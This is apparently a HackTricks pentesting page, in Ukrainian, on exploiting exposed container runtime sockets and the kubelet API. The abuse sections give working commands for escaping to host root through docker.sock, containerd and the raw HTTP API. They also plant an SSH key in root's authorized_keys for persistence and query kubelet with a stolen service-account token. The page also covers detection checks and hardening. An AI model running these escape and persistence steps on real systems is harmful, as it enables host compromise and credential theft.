# Відкриття Runtime API та daemon

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Багато реальних компрометацій контейнерів взагалі не починаються з escape із namespace. Вони починаються з доступу до control plane runtime. Якщо workload може взаємодіяти з `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix socket чи відкритий TCP listener, attacker може отримати можливість запросити новий container із підвищеними privileges, змонтувати файлову систему host, приєднатися до host namespaces або отримати sensitive information про node. У таких випадках runtime API є справжньою security boundary, а його компрометація функціонально майже еквівалентна компрометації host.

Саме тому exposure runtime socket слід документувати окремо від kernel protections. Container зі звичайними seccomp, capabilities і MAC confinement все одно може бути лише за одним API call від компрометації host, якщо `/var/run/docker.sock` або `/run/containerd/containerd.sock` змонтовано всередині нього. Kernel isolation поточного container може працювати саме так, як задумано, тоді як management plane runtime залишається повністю exposed.

## Моделі доступу до daemon

Docker Engine традиційно надає доступ до свого privileged API через локальний Unix socket `unix:///var/run/docker.sock`. Історично він також був доступний віддалено через TCP listeners, такі як `tcp://0.0.0.0:2375`, або через TLS-protected listener на `2376`. Відкриття daemon віддалено без strong TLS і client authentication фактично перетворює Docker API на remote root interface.

containerd, CRI-O, Podman і kubelet надають подібні high-impact surfaces. Назви та workflows відрізняються, але логіка залишається тією самою. Якщо interface дозволяє caller створювати workloads, монтувати host paths, отримувати credentials або змінювати запущені containers, це interface є privileged management channel і має розглядатися відповідно.

Поширені локальні paths, які варто перевірити:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Старіші або більш спеціалізовані стеки також можуть відкривати такі endpoints, як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. У сучасних середовищах вони трапляються рідше, але в разі виявлення до них слід ставитися з такою самою обережністю, оскільки вони є поверхнями керування runtime, а не звичайними application sockets.

## Безпечний віддалений доступ

Якщо daemon потрібно відкрити за межами локального socket, з’єднання слід захистити за допомогою TLS і, бажано, mutual authentication, щоб daemon перевіряв клієнта, а клієнт — daemon. Стара звичка відкривати Docker daemon через звичайний HTTP заради зручності є однією з найнебезпечніших помилок в адмініструванні контейнерів, оскільки API surface достатньо потужна для безпосереднього створення privileged containers.

Історичний шаблон конфігурації Docker мав такий вигляд:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на базі systemd обмін даними з daemon також може мати вигляд `fd://`, тобто процес успадковує попередньо відкритий socket від systemd, а не прив’язує його безпосередньо самостійно. Важливий висновок полягає не в точному синтаксисі, а в наслідках для безпеки. Щойно daemon починає прослуховувати щось, окрім локального socket із жорстко обмеженими дозволами, захист транспорту й автентифікація клієнтів стають обов’язковими, а не додатковим hardening.

## Зловживання

Якщо присутній runtime socket, перевірте, який саме це socket, чи існує сумісний client і чи можливий доступ через raw HTTP або gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ці команди корисні, оскільки дають змогу відрізнити непрацюючий шлях, змонтований, але недоступний socket і активний привілейований API. Якщо клієнт успішно підключається, наступне питання полягає в тому, чи може API запустити новий container із host bind mount або спільним використанням host namespace.

### Якщо клієнт не встановлено

Відсутність `docker`, `podman` або іншого зручного CLI не означає, що socket безпечний. Docker Engine працює через HTTP поверх Unix socket, а Podman надає як Docker-compatible API, так і Libpod-native API через `podman system service`. Це означає, що мінімального середовища лише з `curl` може бути достатньо для керування daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Це важливо під час post-exploitation, оскільки захисники іноді видаляють стандартні клієнтські binary, але залишають змонтований management socket. На Podman hosts пам’ятайте, що цінний шлях відрізняється між rootful і rootless deployments: `unix:///run/podman/podman.sock` для rootful service instances і `unix://$XDG_RUNTIME_DIR/podman/podman.sock` для rootless.

### Повний приклад: Docker Socket до Host Root

Якщо `docker.sock` доступний, класичний escape полягає в запуску нового container, який монтує кореневу файлову систему host, а потім виконує `chroot` у неї:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це забезпечує пряме виконання з правами host-root через Docker daemon. Вплив не обмежується лише читанням файлів. Опинившись у новому контейнері, attacker може змінювати файли host, викрадати credentials, впроваджувати persistence або запускати додаткові privileged workloads.

### Повний приклад: Docker Socket To Host Namespaces

Якщо attacker надає перевагу namespace entry замість доступу лише до файлової системи:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях досягає host, змушуючи runtime створити новий container із явним доступом до host namespaces, а не використовуючи вразливість поточного container.

### Docker Socket Persistence Pattern

Керування runtime також можна використовувати для Persistence замість одноразової shell-сесії. Загальний патерн полягає у створенні допоміжного container із mount до host, записуванні матеріалів авторизованого доступу або startup hook у змонтовану файлову систему host, а потім перевірці, чи використовує host ці дані.

Прикладова структура:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Та сама ідея може застосовуватися до systemd units, cron fragments, application startup files або SSH keys — залежно від того, що оператор хоче довести. Важливо те, що persistent change виконується через host-level filesystem authority runtime daemon, а не завдяки додатковим привілеям в оригінальному container.

### Raw Docker API Helper Pivot

Коли Docker CLI відсутній, тим самим helper flow із host-mount можна керувати через HTTP через Unix socket. Загальний flow такий: підтвердити API, створити helper container із host bind mount, запустити його, створити exec instance і запустити цей exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Фінальний запит `/exec/<id>/start` залежить від отриманого exec ID, але суть безпеки не залежить від точної JSON-структури: прямого доступу до API rootful Docker daemon достатньо, щоб запросити потужніше допоміжне робоче навантаження.

### Повний приклад: Socket containerd

Змонтований Socket `containerd` зазвичай є не менш небезпечним:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Якщо доступний клієнт, більш схожий на Docker, `nerdctl` може бути зручнішим за `ctr`, оскільки він підтримує знайомі прапорці, такі як `--privileged`, `--pid=host` і `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Впливом знову є компрометація хоста. Навіть якщо Docker-specific tooling відсутній, інший runtime API все одно може надавати такі самі адміністративні можливості. На Kubernetes nodes `crictl` також може бути достатнім для reconnaissance та взаємодії з контейнерами, оскільки він безпосередньо взаємодіє з CRI endpoint.

### BuildKit Socket

`buildkitd` легко не помітити, оскільки його часто вважають «лише backend для build», але daemon усе одно є привілейованою control plane. Доступний `buildkitd.sock` може дозволити attacker виконувати довільні build steps, перевіряти можливості worker, використовувати локальні contexts із compromised environment і запитувати небезпечні entitlements, як-от `network.host` або `security.insecure`, якщо daemon було налаштовано на їх дозвіл.

Корисні перші взаємодії:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Якщо daemon приймає build-запити, перевірте, чи доступні небезпечні entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Точний вплив залежить від конфігурації daemon, але rootful BuildKit service із permissive entitlements не є нешкідливою зручністю для розробників. Розглядайте його як ще одну високопріоритетну адміністративну поверхню, особливо на CI runners і спільних build nodes.

### Kubelet API через TCP

Kubelet не є container runtime, але все одно входить до площини керування node і часто розглядається в межах тієї самої trust boundary. Якщо secure port kubelet `10250` доступний із workload або якщо exposed node credentials, kubeconfigs чи proxy rights, attacker може отримати можливість перелічувати Pods, отримувати logs або виконувати commands у node-local containers, навіть не взаємодіючи зі шляхом admission Kubernetes API server.

Почніть із дешевого discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Якщо kubelet або proxy-шлях API-server авторизує `exec`, клієнт із підтримкою WebSocket може перетворити це на code execution в інших контейнерах на вузлі. Саме тому `nodes/proxy` лише з дозволом `get` небезпечніший, ніж здається: запит усе одно може досягти endpoint-ів kubelet, які виконують команди, а такі прямі взаємодії з kubelet не відображаються у звичайних audit logs Kubernetes.<sup>[[2]](#references)</sup>

## Перевірки

Мета цих перевірок — визначити, чи може контейнер отримати доступ до будь-якої management plane, яка мала залишатися за межами межі довіри.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Що тут цікаво:

- Підключений runtime socket зазвичай є прямим адміністративним примітивом, а не просто розкриттям інформації.
- TCP listener на `2375` без TLS слід розглядати як умову для remote compromise.
- Змінні середовища, такі як `DOCKER_HOST`, часто показують, що workload навмисно спроєктований для взаємодії з runtime хоста.

## Runtime Defaults

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Локальний Unix socket за замовчуванням | `dockerd` слухає локальний socket, а daemon зазвичай є rootful | підключення `/var/run/docker.sock`, відкриття `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | Daemonless CLI за замовчуванням | Для звичайного локального використання не потрібен довгоживучий привілейований daemon; API sockets усе одно можуть бути відкриті, якщо ввімкнено `podman system service` | відкриття `podman.sock`, широке виконання service, rootful API use |
| containerd | Локальний привілейований socket | Адміністративний API відкритий через локальний socket і зазвичай використовується інструментами вищого рівня | підключення `containerd.sock`, широкий доступ через `ctr` або `nerdctl`, відкриття привілейованих namespaces |
| CRI-O | Локальний привілейований socket | CRI endpoint призначений для довірених компонентів, локальних для вузла | підключення `crio.sock`, відкриття CRI endpoint для ненадійних workloads |
| Kubernetes kubelet | Node-local management API | Kubelet не повинен бути широко доступним з Pods; залежно від authn/authz доступ може розкрити стан pods, credentials і функції виконання | підключення kubelet sockets або certs, слабка kubelet auth, host networking разом із доступним kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
